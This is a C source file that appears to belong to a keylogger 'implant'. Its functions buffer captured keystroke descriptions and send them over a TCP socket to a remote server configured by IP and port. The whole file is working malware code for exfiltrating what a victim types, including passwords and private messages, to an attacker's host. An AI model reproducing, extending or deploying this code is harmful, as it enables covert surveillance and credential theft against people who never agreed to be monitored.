
/*
    this file holds all of the functions needed for communicating with the
    remote server
*/


#include <stddef.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <errno.h>
#include <unistd.h>

#include "implant.h"


int send_key_description(int sockfd, char *key_desc) {

    /*
        creates a standalone buffer of at least 10 * STRING_BUFFER_SIZE,
        and only sends a message once the buffer size is full.

        it is the responsability of the user to not pick a STRING_BUFFER_SIZE
        such that a size_t can hold 10 times its size in nb of characters.
    */

#ifdef DEBUG
    /* i dont want to wait that long when testing lol */

    const size_t max_nb_chars = STRING_BUFFER_SIZE;
    static char tmp_buffer[STRING_BUFFER_SIZE] = { 0 };
#else
    const size_t max_nb_chars = STRING_BUFFER_SIZE * 10;
    static char tmp_buffer[STRING_BUFFER_SIZE * 10] = { 0 };
#endif

    static size_t nb_chars_in_buffer = 0;


    /* since DEBUG has timeout for keyboard read, we can get empty keys sometimes */
    size_t length_keydesc = strlen(key_desc);
    if (length_keydesc == 0) {
        return SUCCESSFUL;
    }

#ifdef DEBUG
            DEBUG_LOG(
                "buffer: %s [%ld / %ld]",
                tmp_buffer,
                nb_chars_in_buffer,
                max_nb_chars
            );

            DEBUG_LOG("new key: %s", key_desc);
#endif


    if (max_nb_chars < (nb_chars_in_buffer + length_keydesc)) {
        if (-1 == send(sockfd, tmp_buffer, nb_chars_in_buffer, 0)) {

#ifdef DEBUG
            DEBUG_LOG("send: %s", strerror(errno));
#endif
            return ERROR;
        }

        memset(tmp_buffer, 0, nb_chars_in_buffer);
        nb_chars_in_buffer = 0;

        if (NULL == strncpy(tmp_buffer, key_desc, max_nb_chars)) {
#ifdef DEBUG
            DEBUG_LOG("strncpy send_key_description: %s", strerror(errno));
#endif
            return ERROR;
        }

    } else {

        if (NULL == strncat(tmp_buffer, key_desc, max_nb_chars - nb_chars_in_buffer)) {
#ifdef DEBUG
            DEBUG_LOG("strncat send_key_description: %s", strerror(errno));
#endif
            return ERROR;
        }

    }

    nb_chars_in_buffer = strlen(tmp_buffer);
    return SUCCESSFUL;
}



int init_remote_connection(implant_t *instance) {

#ifdef DEBUG
    DEBUG_LOG("Initiating remote connection with (%s:%d)", instance->ip, instance->port);
#endif

    /*
       creating initial socket...

       AF_INET          -> remote connection    (for local, use AF_UNIX)
       SOCK_STREAM      -> TCP connection       (for UDP, use SOCK_DGRAM)
       IPPROTO_TCP      -> Specify protocol     (for UDP, use IPPROTO_UDP)

    */
    int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sockfd < 0) {

#ifdef DEBUG
        perror("socket");
#endif

        close(sockfd);
        return -1;
    }

    /* items required to bind socket to remote address */
    int is_enabled = 1;
    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = htons(instance->port),
        .sin_addr.s_addr = inet_addr(instance->ip)
    };


    /* setting socket options to make connection more convenient */
    if (setsockopt(
            sockfd,
            SOL_SOCKET,
            SO_REUSEADDR | SO_REUSEPORT, /* allowing to reuse ADDR or PORT (useful for testing) */
            &is_enabled,
            sizeof(int)
        ) < 0) {

#ifdef DEBUG
        DEBUG_LOG("setsockopt send_key_description: %s", strerror(errno));
#endif

        close(sockfd);
        return -1;
    }

    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {

#ifdef DEBUG
        DEBUG_LOG("connect: %s", strerror(errno));
#endif

        close(sockfd);
        return -1;
    }

    return sockfd;
}
